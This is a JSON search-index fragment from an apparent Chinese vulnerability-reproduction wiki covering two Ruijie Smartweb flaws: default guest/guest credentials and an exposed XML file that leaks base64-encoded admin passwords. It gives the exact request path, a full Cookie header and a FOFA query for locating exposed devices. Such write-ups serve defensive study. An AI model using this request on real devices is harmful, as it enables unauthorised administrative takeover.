\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u9510\u6377smartweb\u7ba1\u7406\u7cfb\u7edf-\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9510\u6377\u7f51\u7edc\u80a1\u4efd\u6709\u9650\u516c\u53f8\u65e0\u7ebfsmartweb\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u903b\u8f91\u7f3a\u9677\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ece\u6f0f\u6d1e\u83b7\u53d6\u5230\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff0c\u4ece\u800c\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u767b\u5f55\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u9510\u6377\u7f51\u7edc\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u65e0\u7ebfsmartweb\u7ba1\u7406\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u65e0\u7ebfsmartWeb--\u767b\u5f55\u9875\u9762\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u9ed8\u8ba4\u5b58\u5728 guest\u8d26\u6237\uff0c\u8d26\u53f7\u5bc6\u7801\u4e3a guest/guest \u5176\u4e2d\u767b\u5f55\u7684\u8fc7\u7a0b\u4e2d\u641c\u7d22admin\u7684\u6570\u636e\u540e\u53d1\u73b0\u8bf7\u6c42\u4e86\u4e00\u4e2a\u6587\u4ef6 /web/xml/webuser-auth.xml \uff0c\u800c\u4e14\u54cd\u5e94\u4e2d\u5305\u542b\u4e86 admin\u5bc6\u7801\u7684base64\u52a0\u5bc6 \u89e3\u5bc6\u5c31\u53ef\u4ee5\u83b7\u5f97 admin\u7ba1\u7406\u5458\u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u76f4\u63a5\u8bf7\u6c42 http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml Cookie\u6dfb\u52a0 Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest \u76f4\u63a5\u83b7\u5f97\u6240\u6709\u7684\u8d26\u6237\u7684\u7b49\u7ea7\u6807\u5fd7\u548cbase64\u52a0\u5bc6\u7684\u8d26\u53f7\u5bc6\u7801","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Ruijie_smartweb_password_information_disclosure","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/","text":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u5f00\u542fGuest\u8d26\u6237\u6f0f\u6d1e CNVD-2020-56167 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u5f00\u542fGuest\u8d26\u6237\u6f0f\u6d1e \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u767b\u5f55\u540e\u53f0\u8fdb\u4e00\u6b65\u653b\u51fb \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u9510\u6377\u7f51\u7edc\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u65e0\u7ebfsmartweb\u7ba1\u7406\u7cfb\u7edf FOFA \u00b6 [!NOTE] title=\"\u65e0\u7ebfsmartWeb--\u767b\u5f55\u9875\u9762\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u7684\u8d26\u53f7\u5bc6\u7801\u4e3a guest/guest Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Ruijie smartweb weak password","title":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u5f00\u542fGuest\u8d26\u6237\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#\u9510\u6377smartweb\u7ba1\u7406\u7cfb\u7edf-\u9ed8\u8ba4\u5f00\u542fguest\u8d26\u6237\u6f0f\u6d1e-cnvd-2020-56167","text":"","title":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u5f00\u542fGuest\u8d26\u6237\u6f0f\u6d1e CNVD-2020-56167"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u9ed8\u8ba4\u5f00\u542fGuest\u8d26\u6237\u6f0f\u6d1e \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u767b\u5f55\u540e\u53f0\u8fdb\u4e00\u6b65\u653b\u51fb","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u9510\u6377\u7f51\u7edc\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u65e0\u7ebfsmartweb\u7ba1\u7406\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u65e0\u7ebfsmartWeb--\u767b\u5f55\u9875\u9762\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u7684\u8d26\u53f7\u5bc6\u7801\u4e3a guest/guest","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFGuest%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Ruijie smartweb weak password","title":"Goby &amp; POC"}]}